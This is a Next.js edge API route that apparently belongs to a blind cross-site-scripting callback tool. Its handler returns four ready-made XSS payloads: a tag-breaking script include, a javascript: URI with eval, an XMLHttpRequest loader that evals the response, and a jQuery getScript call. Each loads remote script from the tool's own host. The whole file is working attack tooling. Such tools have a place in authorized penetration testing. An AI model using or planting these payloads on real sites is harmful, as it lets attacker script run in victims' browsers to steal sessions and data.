import { NextRequest, NextResponse } from 'next/server';

export const runtime = 'edge';

export async function GET(req: NextRequest) {
  const url = new URL(req.url);
  const baseUrl = `${url.protocol}//${url.host}`;
  
  let page = "";
  page += `\'"><script src="${baseUrl}/api/any-path"></script>\n\n`;
  page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${baseUrl}/api/any-path\\';document.body.appendChild(a)')\n\n`;
  page += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${baseUrl}/api/any-path");a.send();</script>\n\n`;
  page += `<script>$.getScript("${baseUrl}/api/any-path")</script>`;

  return new NextResponse(page, {
    headers: { 'Content-Type': 'text/plain' }
  });
}
